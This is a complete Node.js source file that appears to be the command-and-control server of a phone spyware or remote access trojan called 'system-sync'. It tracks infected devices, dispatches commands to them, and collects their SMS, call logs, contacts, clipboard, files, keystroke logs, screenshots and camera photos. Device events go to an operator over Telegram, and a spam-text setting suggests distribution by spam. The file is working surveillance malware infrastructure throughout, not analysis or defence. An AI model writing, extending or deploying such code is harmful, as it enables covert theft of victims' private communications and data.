const fs = require('fs');
const path = require('path');

let CONFIG = {};
try {
  CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, 'data.json'), 'utf8'));
} catch (e) { CONFIG = {}; }

CONFIG.token = process.env.TG_TOKEN || CONFIG.token;
CONFIG.id    = process.env.TG_ID    || CONFIG.id;
CONFIG.host  = process.env.HOST_URL || CONFIG.host;
CONFIG.text  = process.env.SPAM_TEXT || CONFIG.text;

if (!CONFIG.token) { console.error('token missing'); process.exit(1); }
if (!CONFIG.host)  { console.error('host missing'); process.exit(1); }

const _tg = require('node-telegram-bot-api');
const TelegramBot = _tg.TelegramBot || _tg.Bot || _tg.default || _tg;
if (typeof TelegramBot !== 'function') {
  console.error('bot-api failed. npm i --save-exact node-telegram-bot-api@0.66.0');
  process.exit(1);
}

const { Server } = require('socket.io');
const express = require('express');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);
app.use('/uploads', express.static(uploadsDir));

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on 0.0.0.0:${PORT}`);
  console.log(`Admin : ${CONFIG.host}`);
});

const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const bot = new TelegramBot(CONFIG.token, { polling: true });
bot.on('polling_error', (e) => console.error('[tg]', e.message));

const devices = new Map();
const pending = new Map();
const dataStore = new Map();

function ensureStore(id) {
  if (!dataStore.has(id)) {
    dataStore.set(id, { sms: [], calls: [], contacts: [], apps: [],
      clipboard: '', files: [], keylogs: [], screenshots: [] });
  }
  return dataStore.get(id);
}

function tgNotify(text) {
  if (!CONFIG.id) return;
  bot.sendMessage(CONFIG.id, text, { parse_mode: 'HTML' }).catch(() => {});
}

app.get('/healthz', (req, res) => res.status(200).send('ok'));

io.on('connection', (socket) => {
  const deviceId = socket.handshake.query.id;
  const role = socket.handshake.query.role || 'device';

  if (role === 'device' && deviceId) {
    devices.set(deviceId, { socket, info: socket.handshake.query, lastSeen: Date.now() });
    ensureStore(deviceId);
    console.log(`[device] ${deviceId} online`);
    tgNotify(`<b>New device online</b>\n<code>${deviceId}</code>`);
    io.emit('devices:update', listDevices());
  }

  socket.on('response', (payload) => {
    const { requestId, success, data, type } = payload || {};
    const p = pending.get(requestId);
    if (p) { clearTimeout(p.timer); pending.delete(requestId); p.resolve({ success, data }); }

    if (deviceId && type) {
      const store = ensureStore(deviceId);
      if (type === 'sms') store.sms = data;
      else if (type === 'calls') store.calls = data;
      else if (type === 'contacts') store.contacts = data;
      else if (type === 'apps') store.apps = data;
      else if (type === 'clipboard') store.clipboard = data;
      else if (type === 'files') store.files = data;
      else if (type === 'keylogs') store.keylogs = (store.keylogs || []).concat(data || []);
    }
    if ((type === 'screenshot' || type === 'camera') && data) {
      const ext = type === 'screenshot' ? 'png' : 'jpg';
      const fname = `${deviceId}_${type}_${Date.now()}.${ext}`;
      fs.writeFileSync(path.join(uploadsDir, fname), Buffer.from(data, 'base64'));
      ensureStore(deviceId).screenshots.push(fname);
      io.emit('screenshot:new', { deviceId, file: fname });
    }
    io.emit('log', { deviceId, payload });
  });

  socket.on('keylog', ({ text }) => {
    if (!deviceId) return;
    ensureStore(deviceId).keylogs.push({ t: Date.now(), text });
    io.emit('keylog:new', { deviceId, text, t: Date.now() });
  });

  socket.on('disconnect', () => {
    if (role === 'device' && deviceId) {
      devices.delete(deviceId);
      console.log(`[device] ${deviceId} offline`);
      tgNotify(`<b>Device offline</b>\n<code>${deviceId}</code>`);
      io.emit('devices:update', listDevices());
    }
  });
});

function listDevices() {
  return [...devices.entries()].map(([id, d]) => ({ id, info: d.info, lastSeen: d.lastSeen }));
}

function dispatch(deviceId, request, extras = {}, timeoutMs = 30000) {
  const dev = devices.get(deviceId);
  if (!dev) return Promise.resolve({ success: false, data: 'device offline' });
  const requestId = uuidv4();
  return new Promise((resolve) => {
    const timer = setTimeout(() => { pending.delete(requestId); resolve({ success: false, data: 'timeout' }); }, timeoutMs);
    pending.set(requestId, { resolve, timer });
    dev.socket.emit('command', { requestId, request, extras });
  });
}

app.get('/api/config', (req, res) => {
  res.json({ text: CONFIG.text || '', owner: CONFIG.id || '', host: CONFIG.host });
});

app.get('/api/devices', (req, res) => res.json(listDevices()));

app.post('/api/cmd', async (req, res) => {
  const { deviceId, request, extras } = req.body;
  if (!deviceId || !request) return res.status(400).json({ error: 'deviceId+request required' });
  const result = await dispatch(deviceId, request, extras || {});
  res.json(result);
});

app.get('/api/data/:deviceId/:type', (req, res) => {
  const store = dataStore.get(req.params.deviceId);
  if (!store) return res.status(404).json({ error: 'no device' });
  res.json(store[req.params.type] || []);
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || '';
  if (String(chatId) !== String(CONFIG.id)) return;
  if (text === '/start') {
    bot.sendMessage(chatId, '<b>system-sync</b>\nAdmin: ' + CONFIG.host, { parse_mode: 'HTML' });
  } else if (text === '/devices') {
    const list = listDevices().map(d => `• <code>${d.id}</code>`).join('\n') || 'none';
    bot.sendMessage(chatId, `<b>Devices:</b>\n${list}`, { parse_mode: 'HTML' });
  }
});
